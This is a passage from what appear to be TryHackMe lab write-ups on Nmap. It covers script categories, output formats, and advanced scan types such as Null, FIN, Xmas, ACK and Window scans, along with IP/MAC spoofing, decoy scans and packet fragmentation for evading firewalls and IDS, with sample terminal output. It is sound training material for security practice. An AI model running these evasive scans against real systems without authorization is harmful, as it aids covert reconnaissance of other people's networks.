http-vuln-cve2013-6786.nsehttp-git.nse                            http-vuln-cve2013-7091.nsehttp-gitweb-projects-enum.nse           http-vuln-cve2014-2126.nsehttp-google-malware.nse                 http-vuln-cve2014-2127.nsehttp-grep.nse                           http-vuln-cve2014-2128.nsehttp-headers.nse                        http-vuln-cve2014-2129.nsehttp-huawei-hg5xx-vuln.nse              http-vuln-cve2014-3704.nsehttp-icloud-findmyiphone.nse            http-vuln-cve2014-8877.nsehttp-icloud-sendmsg.nse                 http-vuln-cve2015-1427.nsehttp-iis-short-name-brute.nse           http-vuln-cve2015-1635.nsehttp-iis-webdav-vuln.nse                http-vuln-cve2017-1001000.nsehttp-internal-ip-disclosure.nse         http-vuln-cve2017-5638.nsehttp-joomla-brute.nse                   http-vuln-cve2017-5689.nsehttp-litespeed-sourcecode-download.nse  http-vuln-cve2017-8917.nsehttp-ls.nse                             http-vuln-misfortune-cookie.nsehttp-majordomo2-dir-traversal.nse       http-vuln-wnr1000-creds.nsehttp-malware-host.nse                   http-waf-detect.nsehttp-mcmp.nse                           http-waf-fingerprint.nsehttp-method-tamper.nse                  http-webdav-scan.nsehttp-methods.nse                        http-wordpress-brute.nsehttp-mobileversion-checker.nse          http-wordpress-enum.nsehttp-ntlm-info.nse                      http-wordpress-users.nsehttp-open-proxy.nse                     http-xssed.nsehttp-open-redirect.nse\nYou can specify to use any or a group of these installed scripts; moreover, you can install other user’s scripts and use them for your scans. Let’s begin with the default scripts. You can choose to run the scripts in the default category using –script&#x3D;default or simply adding -sC. In addition to default, categories include auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, and vuln. A brief description is shown in the following table.\n\n\n\nScript Category\nDescription\n\n\n\nauth\nAuthentication related scripts\n\n\nbroadcast\nDiscover hosts by sending broadcast messages\n\n\nbrute\nPerforms brute-force password auditing against logins\n\n\ndefault\nDefault scripts, same as -sC\n\n\ndiscovery\nRetrieve accessible information, such as database tables and DNS names\n\n\ndos\nDetects servers vulnerable to Denial of Service (DoS)\n\n\nexploit\nAttempts to exploit various vulnerable services\n\n\nexternal\nChecks using a third-party service, such as Geoplugin and Virustotal\n\n\nfuzzer\nLaunch fuzzing attacks\n\n\nintrusive\nIntrusive scripts such as brute-force attacks and exploitation\n\n\nmalware\nScans for backdoors\n\n\nsafe\nSafe scripts that won’t crash the target\n\n\nversion\nRetrieve service versions\n\n\nvuln\nChecks for vulnerabilities or exploit vulnerable services\n\n\nSome scripts belong to more than one category. Moreover, some scripts launch brute-force attacks against services, while others launch DoS attacks and exploit systems. Hence, it is crucial to be careful when selecting scripts to run if you don’t want to crash services or exploit them.\nWe use Nmap to run a SYN scan against MACHINE_IP and execute the default scripts in the console shown below. The command is sudo nmap -sS -sC MACHINE_IP, where -sC will ensure that Nmap will execute the default scripts following the SYN scan. There are new details that appear below. Take a look at the SSH service at port 22; Nmap recovered all four public keys related to the running server. Consider another example, the HTTP service at port 80; Nmap retrieved the default page title. We can see that the page has been left as default.\nPentester Terminal\n1234567891011121314151617181920212223242526272829303132333435pentester@TryHackMe$ sudo nmap -sS -sC MACHINE_IPStarting Nmap 7.60 ( https://nmap.org ) at 2021-09-10 05:08 BSTNmap scan report for ip-10-10-161-170.eu-west-1.compute.internal (10.10.161.170)Host is up (0.0011s latency).Not shown: 994 closed portsPORT    STATE SERVICE22/tcp  open  ssh| ssh-hostkey: |   1024 d5:80:97:a3:a8:3b:57:78:2f:0a:78:ae:ad:34:24:f4 (DSA)|   2048 aa:66:7a:45:eb:d1:8c:00:e3:12:31:d8:76:8e:ed:3a (RSA)|   256 3d:82:72:a3:07:49:2e:cb:d9:87:db:08:c6:90:56:65 (ECDSA)|_  256 dc:f0:0c:89:70:87:65:ba:52:b1:e9:59:f7:5d:d2:6a (EdDSA)25/tcp  open  smtp|_smtp-commands: debra2.thm.local, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, | ssl-cert: Subject: commonName=debra2.thm.local| Not valid before: 2021-08-10T12:10:58|_Not valid after:  2031-08-08T12:10:58|_ssl-date: TLS randomness does not represent time80/tcp  open  http|_http-title: Welcome to nginx on Debian!110/tcp open  pop3|_pop3-capabilities: RESP-CODES CAPA TOP SASL UIDL PIPELINING AUTH-RESP-CODE111/tcp open  rpcbind| rpcinfo: |   program version   port/proto  service|   100000  2,3,4        111/tcp  rpcbind|   100000  2,3,4        111/udp  rpcbind|   100024  1          38099/tcp  status|_  100024  1          54067/udp  status143/tcp open  imap|_imap-capabilities: LITERAL+ capabilities IMAP4rev1 OK Pre-login ENABLE have LOGINDISABLEDA0001 listed SASL-IR ID more post-login LOGIN-REFERRALS IDLEMAC Address: 02:A0:E7:B5:B6:C5 (Unknown)Nmap done: 1 IP address (1 host up) scanned in 2.21 seconds \nYou can also specify the script by name using –script “SCRIPT-NAME” or a pattern such as –script “ftp*”, which would include ftp-brute. If you are unsure what a script does, you can open the script file with a text reader, such as less, or a text editor. In the case of ftp-brute, it states: “Performs brute force password auditing against FTP servers.” You have to be careful as some scripts are pretty intrusive. Moreover, some scripts might be for a specific server and, if chosen at random, will waste your time with no benefit. As usual, make sure that you are authorized to launch such tests on the target server.\nLet’s consider a benign script, http-date, which we guess would retrieve the http server date and time, and this is indeed confirmed in its description: “Gets the date from HTTP-like services. Also, it prints how much the date differs from local time…” On the AttackBox, we execute sudo nmap -sS -n –script “http-date” MACHINE_IP as shown in the console below.\nPentester Terminal\n1234567891011121314151617pentester@TryHackMe$ sudo nmap -sS -n --script &quot;http-date&quot; MACHINE_IPStarting Nmap 7.60 ( https://nmap.org ) at 2021-09-10 08:04 BSTNmap scan report for MACHINE_IPHost is up (0.0011s latency).Not shown: 994 closed portsPORT    STATE SERVICE22/tcp  open  ssh25/tcp  open  smtp80/tcp  open  http|_http-date: Fri, 10 Sep 2021 07:04:26 GMT; 0s from local time.110/tcp open  pop3111/tcp open  rpcbind143/tcp open  imapMAC Address: 02:44:87:82:AC:83 (Unknown)Nmap done: 1 IP address (1 host up) scanned in 1.78 seconds\nFinally, you might expand the functionality of Nmap beyond the official Nmap scripts; you can write your script or download Nmap scripts from the Internet. Downloading and using a Nmap script from the Internet holds a certain level of risk. So it is a good idea not to run a script from an author you don’t trust.\nQuestions and Answers of the Task\nTASK - 5 Saving the Output:Whenever you run a Nmap scan, it is only reasonable to save the results in a file. Selecting and adopting a good naming convention for your filenames is also crucial. The number of files can quickly grow and hinder your ability to find a previous scan result. The three main formats are:\n-Normal-Grepable (grepable)-XMLThere is a fourth one that we cannot recommend:-Script Kiddie\nNormalAs the name implies, the normal format is similar to the output you get on the screen when scanning a target. You can save your scan in normal format by using -oN FILENAME; N stands for normal. Here is an example of the result.\nPentester Terminal\n12345678910111213141516171819202122pentester@TryHackMe$ cat MACHINE_IP_scan.nmap # Nmap 7.60 scan initiated Fri Sep 10 05:14:19 2021 as: nmap -sS -sV -O -oN MACHINE_IP_scan MACHINE_IPNmap scan report for MACHINE_IPHost is up (0.00086s latency).Not shown: 994 closed portsPORT    STATE SERVICE VERSION22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)25/tcp  open  smtp    Postfix smtpd80/tcp  open  http    nginx 1.6.2110/tcp open  pop3    Dovecot pop3d111/tcp open  rpcbind 2-4 (RPC #100000)143/tcp open  imap    Dovecot imapdMAC Address: 02:A0:E7:B5:B6:C5 (Unknown)Device type: general purposeRunning: Linux 3.XOS CPE: cpe:/o:linux:linux_kernel:3.13OS details: Linux 3.13Network Distance: 1 hopService Info: Host:  debra2.thm.local; OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Fri Sep 10 05:14:28 2021 -- 1 IP address (1 host up) scanned in 9.99 seconds\nGrepableThe grepable format has its name from the command grep; grep stands for Global Regular Expression Printer. In simple terms, it makes filtering the scan output for specific keywords or terms efficient. You can save the scan result in grepable format using -oG FILENAME. The scan output, displayed above in normal format, is shown in the console below using grepable format. The normal output is 21 lines; however, the grepable output is only 4 lines. The main reason is that Nmap wants to make each line meaningful and complete when the user applies grep. As a result, in grepable output, the lines are so long and are not convenient to read compared to normal output.\nPentester Terminal\n12345pentester@TryHackMe$ cat MACHINE_IP_scan.gnmap # Nmap 7.60 scan initiated Fri Sep 10 05:14:19 2021 as: nmap -sS -sV -O -oG MACHINE_IP_scan MACHINE_IPHost: MACHINE_IP\tStatus: UpHost: MACHINE_IP\tPorts: 22/open/tcp//ssh//OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)/, 25/open/tcp//smtp//Postfix smtpd/, 80/open/tcp//http//nginx 1.6.2/, 110/open/tcp//pop3//Dovecot pop3d/, 111/open/tcp//rpcbind//2-4 (RPC #100000)/, 143/open/tcp//imap//Dovecot imapd/\tIgnored State: closed (994)\tOS: Linux 3.13\tSeq Index: 257\tIP ID Seq: All zeros# Nmap done at Fri Sep 10 05:14:28 2021 -- 1 IP address (1 host up) scanned in 9.99 seconds\nAn example use of grep is grep KEYWORD TEXT_FILE; this command will display all the lines containing the provided keyword. Let’s compare the output of using grep on normal output and grepable output. You will notice that the former does not provide the IP address of the host. Instead, it returned 80&#x2F;tcp open http nginx 1.6.2, making it very inconvenient if you are sifting through the scan results of multiple systems. However, the latter provides enough information, such as the host’s IP address, in each line to make it complete.\nPentester Terminal\n123456pentester@TryHackMe$ grep http MACHINE_IP_scan.nmap 80/tcp  open  http    nginx 1.6.2OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Pentester Terminalpentester@TryHackMe$ grep http MACHINE_IP_scan.gnmap Host: MACHINE_IP\tPorts: 22/open/tcp//ssh//OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)/, 25/open/tcp//smtp//Postfix smtpd/, 80/open/tcp//http//nginx 1.6.2/, 110/open/tcp//pop3//Dovecot pop3d/, 111/open/tcp//rpcbind//2-4 (RPC #100000)/, 143/open/tcp//imap//Dovecot imapd/\tIgnored State: closed (994)\tOS: Linux 3.13\tSeq Index: 257\tIP ID Seq: All zeros\nXMLThe third format is XML. You can save the scan results in XML format using -oX FILENAME. The XML format would be most convenient to process the output in other programs. Conveniently enough, you can save the scan output in all three formats using -oA FILENAME to combine -oN, -oG, and -oX for normal, grepable, and XML.\nScript KiddieA fourth format is script kiddie. You can see that this format is useless if you want to search the output for any interesting keywords or keep the results for future reference. However, you can use it to save the output of the scan nmap -sS 127.0.0.1 -oS FILENAME, display the output filename, and look 31337 in front of friends who are not tech-savvy.\nPentester Terminal\n12345678910111213141516171819pentester@TryHackMe$ cat MACHINE_IP_scan.kiddie $tart!ng nMaP 7.60 ( httpz://nMap.0rG ) at 2021-09-10 05:17 B$TNmap scan rEp0rt f0r |p-10-10-161-170.EU-w3$t-1.C0mputE.intErnaL (10.10.161.170)HOSt !s uP (0.00095s LatEncy).N0T $H0wn: 994 closed pOrtSPoRT    st4Te SeRViC3 VERS1on22/tcp  Open  ssH     Op3n$$H 6.7p1 Deb|an 5+dEb8u8 (pr0t0COl 2.0)25/tCp  Op3n  SmTp    P0$Tf!x Smtpd80/tcp  0p3n  http    Ng1nx 1.6.2110/tCP 0pen  pOP3    d0v3coT P0p3D111/TcP op3n  RpcbInd 2-4 (RPC #100000)143/Tcp opEn  Imap    Dovecot 1mApdmAC 4Ddr3sz: 02:40:e7:B5:B6:c5 (Unknown)Netw0rk d!stanc3: 1 h0p$3rv1c3 InFO: Ho$t:  dEBra2.thM.lOcal; 0s: Linux; cPe: cP3:/0:linux:l|nux_k3rnel0S and servIc3 D3tEcti0n pErf0rm3d. Plea$e r3p0rt any !nc0RrecT rE$ultz at hTtpz://nmap.0rg/$ubmit/ .Nmap d0nE: 1 |P addr3SS (1 hoSt up) $CaNnEd !n 21.80 s3c0Ndz \n\nQuestions and answers of this Task\nSUMMARYSummary of Nmap Options\nIn this room, we learned how to detect the running services and their versions along with the host operating system. We learned how to enable traceroute and we covered selecting one or more scripts to aid in penetration testing. Finally, we covered the different formats to save the scan results for future reference. The table below summarizes the most important options we covered in this room.\n\n\n\nOption\nMeaning\n\n\n\n-sV\ndetermine service&#x2F;version info on open ports\n\n\n-sV –version-light\ntry the most likely probes (2)\n\n\n-sV –version-all\ntry all available probes (9)\n\n\n-O\ndetect OS\n\n\n–traceroute\nrun traceroute to target\n\n\n–script&#x3D;SCRIPTS\nNmap scripts to run\n\n\n-sC or –script&#x3D;default\nrun default scripts\n\n\n-A\nequivalent to -sV -O -sC –traceroute\n\n\n-oN\nsave output in normal format\n\n\n-oG\nsave output in grepable format\n\n\n-oX\nsave output in XML format\n\n\n-oA\nsave output in normal, XML and Grepable formats\n\n\nThank You 💌Author: Satvik Shetty🧑‍💻See you again in another writeup\n","slug":"THM/NMAP/Nmap-Post-Port-Scans","date":"2024-05-18T11:07:59.000Z","categories_index":"cybersecurity,THM,NMAP","tags_index":"tryhackme,nmap,information-gathering","author_index":"Satvik"},{"id":"cea3414c622367bb74c9fe88dd9fca82","title":"Nmap Advanced Port Scans","content":"Cheatsheet of the commands used in this room\n\n\nPort Scan Type\nExample Command\n\n\n\nTCP Null Scan\nsudo nmap -sN 10.10.214.83\n\n\nTCP FIN Scan\nsudo nmap -sF 10.10.214.83\n\n\nTCP Xmas Scan\nsudo nmap -sX 10.10.214.83\n\n\nTCP Maimon Scan\nsudo nmap -sM 10.10.214.83\n\n\nTCP ACK Scan\nsudo nmap -sA 10.10.214.83\n\n\nTCP Window Scan\nsudo nmap -sW 10.10.214.83\n\n\nCustom TCP Scan\nsudo nmap –scanflags URGACKPSHRSTSYNFIN 10.10.214.83\n\n\nSpoofed Source IP\nsudo nmap -S SPOOFED_IP 10.10.214.83\n\n\nSpoofed MAC Address\n–spoof-mac SPOOFED_MAC\n\n\nDecoy Scan\nnmap -D DECOY_IP,ME 10.10.214.83\n\n\nIdle (Zombie) Scan\nsudo nmap -sI ZOMBIE_IP 10.10.214.83\n\n\nFragment IP data into 8 bytes\n-f\n\n\nFragment IP data into 16 bytes\n-ff\n\n\n\n\n\nOption\nPurpose\n\n\n\n–source-port PORT_NUM\nspecify source port number\n\n\n–data-length NUM\nappend random data to reach given length\n\n\nThese scan types rely on setting TCP flags in unexpected ways to prompt ports for a reply. Null, FIN, and Xmas scans provoke a response from closed ports, while Maimon, ACK, and Window scans provoke a response from open and closed ports.\n\n\n\nOption\nPurpose\n\n\n\n–reason\nexplains how Nmap made its conclusion\n\n\n-v\nverbose\n\n\n-vv\nvery verbose\n\n\n-d\ndebugging\n\n\n-dd\nmore details for debugging\n\n\n\nIntroductionThis room is the third in the Nmap series (part of the Introduction to Network Security module). In the first two rooms, we learned about live host discovery and basic port scans.\n\nNmap Live Host Discovery\nNmap Basic Port Scans\nNmap Advanced Port Scans\nNmap Post Port ScansIn Nmap Basic Port Scans, we covered TCP flags and reviewed the TCP 3-way handshake. To initiate a connection, TCP requires the first packet to have the SYN flag set. Consequently, we can tell if a TCP port is open based on the response we receive.\n\nSecurity researchers and hackers contemplated the TCP flags, shown in the figure below and explained in the previous room, and started to experiment. They wanted to know what would happen if we send a TCP packet, which is not part of any ongoing TCP connection, with one or more flags set.\n\nFor instance, an ACK flag is set when you want to acknowledge received data. An ACK scan is like trying to acknowledge data that was neither sent nor received in the first place. Consider this simple analogy, someone coming to you out of nowhere to tell you, “yes, I hear you, please continue.” when you haven’t said anything.\nThis room explains advanced types of scans and scan options. Some of these scan types can be useful against specific systems, while others are useful in particular network setups. We will cover the following types of port scans:\nNull ScanFIN ScanXmas ScanMaimon ScanACK ScanWindow ScanCustom Scan\nMoreover, we will cover the following:\nSpoofing IPSpoofing MACDecoy ScanFragmented PacketsIdle&#x2F;Zombie ScanWe will discuss options and techniques to evade firewalls and IDS systems. We also cover options to get more verbose details from Nmap.\nQuestions &amp; Answers in the TaskLaunch the AttackBox by using the Start AttackBox button and get ready to experiment with different types of Nmap scans against different virtual machines.Answer : Click Submit\nTASK-2 TCP Null Scan, FIN Scan, and Xmas ScanLet’s start with the following three types of scans:\n\nNull Scan\nFIN Scan\nXmas Scan\n\nNull ScanThe null scan does not set any flag; all six flag bits are set to zero. You can choose this scan using the -sN option. A TCP packet with no flags set will not trigger any response when it reaches an open port, as shown in the figure below. Therefore, from Nmap’s perspective, a lack of reply in a null scan indicates that either the port is open or a firewall is blocking the packet.\n\nHowever, we expect the target server to respond with an RST packet if the port is closed. Consequently, we can use the lack of RST response to figure out the ports that are not closed: open or filtered.\n\nBelow is an example of a null scan against a Linux server. The null scan we carried out has successfully identified the six open ports on the target system. Because the null scan relies on the lack of a response to infer that the port is not closed, it cannot indicate with certainty that these ports are open; there is a possibility that the ports are not responding due to a firewall rule.\nPentester Terminal\n12345678910111213141516pentester@TryHackMe$ sudo nmap -sN MACHINE_IPStarting Nmap 7.60 ( https://nmap.org ) at 2021-08-30 10:30 BSTNmap scan report for MACHINE_IPHost is up (0.00066s latency).Not shown: 994 closed portsPORT    STATE         SERVICE22/tcp  open|filtered ssh25/tcp  open|filtered smtp80/tcp  open|filtered http110/tcp open|filtered pop3111/tcp open|filtered rpcbind143/tcp open|filtered imapMAC Address: 02:45:BF:8A:2D:6B (Unknown)Nmap done: 1 IP address (1 host up) scanned in 96.50 seconds\nNote that many Nmap options require root privileges. Unless you are running Nmap as root, you need to use sudo as in the example above using the -sN option.\nFIN ScanThe FIN scan sends a TCP packet with the FIN flag set. You can choose this scan type using the -sF option. Similarly, no response will be sent if the TCP port is open. Again, Nmap cannot be sure if the port is open or if a firewall is blocking the traffic related to this TCP port.\n\nHowever, the target system should respond with an RST if the port is closed. Consequently, we will be able to know which ports are closed and use this knowledge to infer the ports that are open or filtered. It’s worth noting some firewalls will ‘silently’ drop the traffic without sending an RST.\n\nBelow is an example of a FIN scan against a Linux server. The result is quite similar to the result we obtained earlier using a null scan.\nPentester Terminal\n12345678910111213141516pentester@TryHackMe$ sudo nmap -sF MACHINE_IPStarting Nmap 7.60 ( https://nmap.org ) at 2021-08-30 10:32 BSTNmap scan report for MACHINE_IPHost is up (0.0018s latency).Not shown: 994 closed portsPORT    STATE         SERVICE22/tcp  open|filtered ssh25/tcp  open|filtered smtp80/tcp  open|filtered http110/tcp open|filtered pop3111/tcp open|filtered rpcbind143/tcp open|filtered imapMAC Address: 02:45:BF:8A:2D:6B (Unknown)Nmap done: 1 IP address (1 host up) scanned in 96.52 seconds\n\nXmas ScanThe Xmas scan gets its name after Christmas tree lights. An Xmas scan sets the FIN, PSH, and URG flags simultaneously. You can select Xmas scan with the option -sX.\nLike the Null scan and FIN scan, if an RST packet is received, it means that the port is closed. Otherwise, it will be reported as open|filtered.\nThe following two figures show the case when the TCP port is open and the case when the TCP port is closed.\n\nThe console output below shows an example of a Xmas scan against a Linux server. The obtained results are pretty similar to that of the null scan and the FIN scan.\nPentester Terminal\n1234567891011121314151617pentester@TryHackMe$ sudo nmap -sX MACHINE_IPStarting Nmap 7.60 ( https://nmap.org ) at 2021-08-30 10:34 BSTNmap scan report for MACHINE_IPHost is up (0.00087s latency).Not shown: 994 closed portsPORT    STATE         SERVICE22/tcp  open|filtered ssh25/tcp  open|filtered smtp80/tcp  open|filtered http110/tcp open|filtered pop3111/tcp open|filtered rpcbind143/tcp open|filtered imapMAC Address: 02:45:BF:8A:2D:6B (Unknown)Nmap done: 1 IP address (1 host up) scanned in 84.85 seconds\nOne scenario where these three scan types can be efficient is when scanning a target behind a stateless (non-stateful) firewall. A stateless firewall will check if the incoming packet has the SYN flag set to detect a connection attempt. Using a flag combination that does not match the SYN packet makes it possible to deceive the firewall and reach the system behind it. However, a stateful firewall will practically block all such crafted packets and render this kind of scan useless.\nQuestions and answers of the task\nTASK 3 - TCP  Maimon ScanUriel Maimon first described this scan in 1996. In this scan, the FIN and ACK bits are set. The target should send an RST packet as a response. However, certain BSD-derived systems drop the packet if it is an open port exposing the open ports. This scan won’t work on most targets encountered in modern networks; however, we include it in this room to better understand the port scanning mechanism and the hacking mindset. To select this scan type, use the -sM option.\nMost target systems respond with an RST packet regardless of whether the TCP port is open. In such a case, we won’t be able to discover the open ports. The figure below shows the expected behaviour in the cases of both open and closed TCP ports.\n\nThe console output below is an example of a TCP Maimon scan against a Linux server. As mentioned, because open ports and closed ports are behaving the same way, the Maimon scan could not discover any open ports on the target system.\nPentester Terminal\n123456789pentester@TryHackMe$ sudo nmap -sM 10.10.252.27Starting Nmap 7.60 ( https://nmap.org ) at 2021-08-30 10:36 BSTNmap scan report for ip-10-10-252-27.eu-west-1.compute.internal (10.10.252.27)Host is up (0.00095s latency).All 1000 scanned ports on ip-10-10-252-27.eu-west-1.compute.internal (10.10.252.27) are closedMAC Address: 02:45:BF:8A:2D:6B (Unknown)Nmap done: 1 IP address (1 host up) scanned in 1.61 seconds\nThis type of scan is not the first scan one would pick to discover a system; however, it is important to know about it as you don’t know when it could come in handy.\nQuestions&amp;Answers of the task\nTASK 4 - TCP ACK, Window, and Custom ScanThis task will cover how to perform a TCP ACK scan, a TCP window scan, and how to create your custom flag scan.\nTCP ACK ScanLet’s start with the TCP ACK scan. As the name implies, an ACK scan will send a TCP packet with the ACK flag set. Use the -sA option to choose this scan. As we show in the figure below, the target would respond to the ACK with RST regardless of the state of the port. This behaviour happens because a TCP packet with the ACK flag set should be sent only in response to a received TCP packet to acknowledge the receipt of some data, unlike our case. Hence, this scan won’t tell us whether the target port is open in a simple setup.\n\nIn the following example, we scanned the target VM before installing a firewall on it. As expected, we couldn’t learn which ports were open.\nPentester Terminal\n123456789pentester@TryHackMe$ sudo nmap -sA MACHINE_IPStarting Nmap 7.60 ( https://nmap.org ) at 2021-08-30 10:37 BSTNmap scan report for MACHINE_IPHost is up (0.0013s latency).All 1000 scanned ports on MACHINE_IP are unfilteredMAC Address: 02:45:BF:8A:2D:6B (Unknown)Nmap done: 1 IP address (1 host up) scanned in 1.68 seconds\nThis kind of scan would be helpful if there is a firewall in front of the target. Consequently, based on which ACK packets resulted in responses, you will learn which ports were not blocked by the firewall. In other words, this type of scan is more suitable to discover firewall rule sets and configuration.\nAfter setting up the target VM MACHINE_IP with a firewall, we repeated the ACK scan. This time, we received some interesting results. As seen in the console output below, we have three ports that aren’t being blocked by the firewall. This result indicates that the firewall is blocking all other ports except for these three ports.\nPentester Terminal\n12345678910111213pentester@TryHackMe$ sudo nmap -sA MACHINE_IPStarting Nmap 7.60 ( https://nmap.org ) at 2021-09-07 11:34 BSTNmap scan report for MACHINE_IPHost is up (0.00046s latency).Not shown: 997 filtered portsPORT    STATE      SERVICE22/tcp  unfiltered ssh25/tcp  unfiltered smtp80/tcp  unfiltered httpMAC Address: 02:78:C0:D0:4E:E9 (Unknown)Nmap done: 1 IP address (1 host up) scanned in 15.45 seconds\n\nWindow ScanAnother similar scan is the TCP window scan. The TCP window scan is almost the same as the ACK scan; however, it examines the TCP Window field of the RST packets returned. On specific systems, this can reveal that the port is open. You can select this scan type with the option -sW. As shown in the figure below, we expect to get an RST packet in reply to our “uninvited” ACK packets, regardless of whether the port is open or closed.\n\nSimilarly, launching a TCP window scan against a Linux system with no firewall will not provide much information. As we can see in the console output below, the results of the window scan against a Linux server with no firewall didn’t give any extra information compared to the ACK scan executed earlier.\nPentester Terminal\n123456789pentester@TryHackMe$ sudo nmap -sW MACHINE_IPStarting Nmap 7.60 ( https://nmap.org ) at 2021-08-30 10:38 BSTNmap scan report for MACHINE_IPHost is up (0.0011s latency).All 1000 scanned ports on ip-10-10-252-27.eu-west-1.compute.internal (10.10.252.27) are closedMAC Address: 02:45:BF:8A:2D:6B (Unknown)Nmap done: 1 IP address (1 host up) scanned in 1.60 seconds\nHowever, as you would expect, if we repeat our TCP window scan against a server behind a firewall, we expect to get more satisfying results. In the console output shown below, the TCP window scan pointed that three ports are detected as closed. (This is in contrast with the ACK scan that labelled the same three ports as unfiltered.) Although we know that these three ports are not closed, we realize they responded differently, indicating that the firewall does not block them.\nPentester Terminal\npentester@TryHackMe$ sudo nmap -sW MACHINE_IP123456789101112Starting Nmap 7.60 ( https://nmap.org ) at 2021-09-07 11:39 BSTNmap scan report for MACHINE_IPHost is up (0.00040s latency).Not shown: 997 filtered portsPORT    STATE  SERVICE22/tcp  closed ssh25/tcp  closed smtp80/tcp  closed httpMAC Address: 02:78:C0:D0:4E:E9 (Unknown)Nmap done: 1 IP address (1 host up) scanned in 14.84 seconds\n\nCustom ScanIf you want to experiment with a new TCP flag combination beyond the built-in TCP scan types, you can do so using –scanflags. For instance, if you want to set SYN, RST, and FIN simultaneously, you can do so using –scanflags RSTSYNFIN. As shown in the figure below, if you develop your custom scan, you need to know how the different ports will behave to interpret the results in different scenarios correctly.\n\nFinally, it is essential to note that the ACK scan and the window scan were very efficient at helping us map out the firewall rules. However, it is vital to remember that just because a firewall is not blocking a specific port, it does not necessarily mean that a service is listening on that port. For example, there is a possibility that the firewall rules need to be updated to reflect recent service changes. Hence, ACK and window scans are exposing the firewall rules, not the services.\nQuestions and Answers of this Task\nTASK 5 Spoofing and DecoysIn some network setups, you will be able to scan a target system using a spoofed IP address and even a spoofed MAC address. Such a scan is only beneficial in a situation where you can guarantee to capture the response. If you try to scan a target from some random network using a spoofed IP address, chances are you won’t have any response routed to you, and the scan results could be unreliable.\nThe following figure shows the attacker launching the command nmap -S SPOOFED_IP MACHINE_IP. Consequently, Nmap will craft all the packets using the provided source IP address SPOOFED_IP. The target machine will respond to the incoming packets sending the replies to the destination IP address SPOOFED_IP. For this scan to work and give accurate results, the attacker needs to monitor the network traffic to analyze the replies.\n\nIn brief, scanning with a spoofed IP address is three steps:\nAttacker sends a packet with a spoofed source IP address to the target machine.Target machine replies to the spoofed IP address as the destination.Attacker captures the replies to figure out open ports.In general, you expect to specify the network interface using -e and to explicitly disable ping scan -Pn. Therefore, instead of nmap -S SPOOFED_IP MACHINE_IP, you will need to issue nmap -e NET_INTERFACE -Pn -S SPOOFED_IP MACHINE_IP to tell Nmap explicitly which network interface to use and not to expect to receive a ping reply. It is worth repeating that this scan will be useless if the attacker system cannot monitor the network for responses.\nWhen you are on the same subnet as the target machine, you would be able to spoof your MAC address as well. You can specify the source MAC address using –spoof-mac SPOOFED_MAC. This address spoofing is only possible if the attacker and the target machine are on the same Ethernet (802.3) network or same WiFi (802.11).\nSpoofing only works in a minimal number of cases where certain conditions are met. Therefore, the attacker might resort to using decoys to make it more challenging to be pinpointed. The concept is simple, make the scan appear to be coming from many IP addresses so that the attacker’s IP address would be lost among them. As we see in the figure below, the scan of the target machine will appear to be coming from 3 different sources, and consequently, the replies will go the decoys as well.\n\nYou can launch a decoy scan by specifying a specific or random IP address after -D. For example, nmap -D 10.10.0.1,10.10.0.2,ME MACHINE_IP will make the scan of MACHINE_IP appear as coming from the IP addresses 10.10.0.1, 10.10.0.2, and then ME to indicate that your IP address should appear in the third order. Another example command would be nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME MACHINE_IP, where the third and fourth source IP addresses are assigned randomly, while the fifth source is going to be the attacker’s IP address. In other words, each time you execute the latter command, you would expect two new random IP addresses to be the third and fourth decoy sources.\nTASK 6 - Fragmented PacketsFirewallA firewall is a piece of software or hardware that permits packets to pass through or blocks them. It functions based on firewall rules, summarized as blocking all traffic with exceptions or allowing all traffic with exceptions. For instance, you might block all traffic to your server except those coming to your web server. A traditional firewall inspects, at least, the IP header and the transport layer header. A more sophisticated firewall would also try to examine the data carried by the transport layer.\nIDSAn intrusion detection system (IDS) inspects network packets for select behavioural patterns or specific content signatures. It raises an alert whenever a malicious rule is met. In addition to the IP header and transport layer header, an IDS would inspect the data contents in the transport layer and check if it matches any malicious patterns. How can you make it less likely for a traditional firewall&#x2F;IDS to detect your Nmap activity? It is not easy to answer this; however, depending on the type of firewall&#x2F;IDS, you might benefit from dividing the packet into smaller packets.\nFragmented PacketsNmap provides the option -f to fragment packets. Once chosen, the IP data will be divided into 8 bytes or less. Adding another -f (-f -f or -ff) will split the data into 16 byte-fragments instead of 8. You can change the default value by using the –mtu; however, you should always choose a multiple of 8.\nTo properly understand fragmentation, we need to look at the IP header in the figure below. It might look complicated at first, but we notice that we know most of its fields. In particular, notice the source address taking 32 bits (4 bytes) on the fourth row, while the destination address is taking another 4 bytes on the fifth row. The data that we will fragment across multiple packets is highlighted in red. To aid in the reassembly on the recipient side, IP uses the identification (ID) and fragment offset, shown on the second row of the figure below.\n\nLet’s compare running sudo nmap -sS -p80 10.20.30.144 and sudo nmap -sS -p80 -f 10.20.30.144. As you know by now, this will use stealth TCP SYN scan on port 80; however, in the second command, we are requesting Nmap to fragment the IP packets.\nIn the first two lines, we can see an ARP query and response. Nmap issued an ARP query because the target is on the same Ethernet. The second two lines show a TCP SYN ping and a reply. The fifth line is the beginning of the port scan; Nmap sends a TCP SYN packet to port 80. In this case, the IP header is 20 bytes, and the TCP header is 24 bytes. Note that the minimum size of the TCP header is 20 bytes.\n\nWith fragmentation requested via -f, the 24 bytes of the TCP header will be divided into multiples of 8 bytes, with the last fragment containing 8 bytes or less of the TCP header. Since 24 is divisible by 8, we got 3 IP fragments; each has 20 bytes of IP header and 8 bytes of TCP header. We can see the three fragments between the fifth and the seventh lines.\n\nNote that if you added -ff (or -f -f), the fragmentation of the data will be multiples of 16. In other words, the 24 bytes of the TCP header, in this case, would be divided over two IP fragments, the first containing 16 bytes and the second containing 8 bytes of the TCP header.\nOn the other hand, if you prefer to increase the size of your packets to make them look innocuous, you can use the option –data-length NUM, where num specifies the number of bytes you want to append to your packets.\nQuestion and Answers of the task\nTASK 7 - Idle &#x2F; Zombie ScanSpoofing the source IP address can be a great approach to scanning stealthily. However, spoofing will only work in specific network setups. It requires you to be in a position where you can monitor the traffic. Considering these 